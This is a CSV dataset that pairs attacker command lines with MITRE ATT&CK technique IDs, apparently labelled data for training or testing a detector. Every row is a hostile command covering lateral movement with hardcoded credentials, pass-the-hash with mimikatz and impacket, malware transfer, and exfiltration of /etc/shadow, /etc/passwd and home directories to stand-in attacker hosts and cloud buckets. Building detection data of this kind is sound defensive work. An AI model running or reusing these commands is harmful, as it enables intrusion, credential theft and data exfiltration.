command,mitre_id
ssh -L 8080:internal-host:80 user@pivot.host,T1021
ssh -R 9090:localhost:22 user@attacker.com,T1021
xfreerdp /u:Administrator /p:Password1! /v:10.0.0.5,T1021
xfreerdp /u:DOMAIN\user /p:pass /v:192.168.1.10 /cert-ignore,T1021
smbclient //10.0.0.5/C$ -U Administrator%Password1,T1021
psexec \\10.0.0.5 -u Administrator -p Password1 cmd.exe,T1021
wmic /node:10.0.0.5 /user:Administrator /password:Password1 process call create "cmd.exe /c whoami",T1021
net use \\10.0.0.5\IPC$ /user:DOMAIN\Administrator Password1,T1021
Invoke-Command -ComputerName 10.0.0.5 -ScriptBlock { whoami },T1021
Enter-PSSession -ComputerName 10.0.0.5 -Credential (Get-Credential),T1021
ssh user@10.0.0.5 -i ~/.ssh/id_rsa 'bash -i',T1021
crackmapexec smb 10.0.0.5 -u Administrator -p Password1 -x "whoami",T1021
impacket-smbclient DOMAIN/Administrator:Password1@10.0.0.5,T1021
pth-winexe -U DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:ntlmhash //10.0.0.5 cmd.exe,T1550
mimikatz "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe",T1550
Invoke-Mimikatz -Command "sekurlsa::pth /user:admin /ntlm:ntlmhash /domain:corp",T1550
python3 /opt/impacket/examples/wmiexec.py -hashes :ntlmhash Administrator@10.0.0.5,T1550
robocopy \\10.0.0.5\C$\Tools C:\Tools /E,T1570
xcopy /Y /S /E \\10.0.0.5\share\malware.exe C:\Windows\Temp\,T1570
scp malware.exe user@10.0.0.5:/tmp/,T1570
python3 -c "import socket; s=socket.socket(); s.connect(('10.0.0.5',445)); open('/tmp/tool.exe','wb').write(s.recv(65536))",T1570
copy \\10.0.0.1\share\payload.exe C:\Windows\Temp\svchost32.exe,T1570
bitsadmin /transfer job1 /download /priority normal http://10.0.0.1/tool.exe C:\Windows\Temp\tool.exe,T1570
curl -o /tmp/lateral_tool http://10.0.0.1/tool && scp /tmp/lateral_tool user@10.0.0.5:/tmp/,T1570
tar czf - /etc/shadow | nc 10.0.0.1 4444,T1048
nc -nv 10.0.0.1 4444 < /etc/passwd,T1048
openssl s_client -connect 10.0.0.1:443 < /etc/shadow,T1048
cat /etc/shadow | base64 | curl -X POST -d @- https://attacker.com/upload,T1048
python3 -c "import smtplib; s=smtplib.SMTP('mail.attacker.com'); s.sendmail('a@b.com','c@d.com',open('/etc/passwd').read())",T1048
ncat --ssl 10.0.0.1 4444 < sensitive_data.txt,T1048
curl --data-urlencode @/etc/passwd "https://attacker.com/exfil?data",T1048
ftp -n 10.0.0.1 -e "user anonymous anon@anon.com" -e "put /etc/passwd",T1048
curl http://attacker.com/$(cat /etc/hostname | base64),T1041
wget --post-file=/tmp/data.tar.gz http://attacker.com/upload,T1041
Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -Body (Get-Content C:\sensitive.txt),T1041
python3 -c "import urllib.request; urllib.request.urlopen('http://c2.attacker.com/?' + open('/etc/passwd').read())",T1041
curl -F "file=@/etc/shadow" http://attacker.com/upload,T1041
certutil -encode C:\Users\user\Documents\secrets.docx C:\Windows\Temp\out.b64 && curl -X POST -d @C:\Windows\Temp\out.b64 http://attacker.com/upload,T1041
zip /tmp/exfil.zip /etc/passwd /etc/shadow && curl -F "f=@/tmp/exfil.zip" http://attacker.com/,T1041
rsync -avz --rsh="ssh -i /tmp/id_rsa" /home/user/ attacker@10.0.0.1:/tmp/loot/,T1020
aws s3 cp /etc/shadow s3://attacker-bucket/shadow.txt,T1567
aws s3 sync /home/user/ s3://attacker-bucket/loot/,T1567
gdrive upload --parent 1AbCdEfGhIj /tmp/loot.tar.gz,T1567
python3 -c "from googleapiclient.discovery import build; service=build('drive','v3'); service.files().create(media_body='/tmp/secrets.zip').execute()",T1567
curl -X POST "https://api.dropbox.com/2/files/upload" -H "Authorization: Bearer TOKEN" --data-binary @/etc/shadow,T1567
